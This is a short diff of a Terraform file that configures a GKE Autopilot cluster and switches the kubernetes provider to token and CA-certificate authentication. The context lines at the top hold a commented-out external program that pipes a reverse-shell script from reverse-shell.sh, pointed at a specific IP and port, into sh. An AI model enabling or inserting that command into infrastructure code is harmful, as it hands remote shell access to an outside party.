@@ -2,14 +2,18 @@
 #   program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
 # }
 
-data "google_container_cluster" "mycluster" {
+
+data "google_container_cluster" "my_cluster" {
   name     = "my-autopilot"
   location = var.region
-  project = var.project_id
 }
 
 provider "kubernetes" {
-  config_context_cluster = data.google_container_cluster.mycluster.name
+  host  = "https://${data.google_container_cluster.my_cluster.endpoint}"
+  token = data.google_client_config.provider.access_token
+  cluster_ca_certificate = base64decode(
+    data.google_container_cluster.my_cluster.master_auth[0].cluster_ca_certificate,
+  )
 }
 
 resource "kubernetes_deployment" "webapp_deployment" {
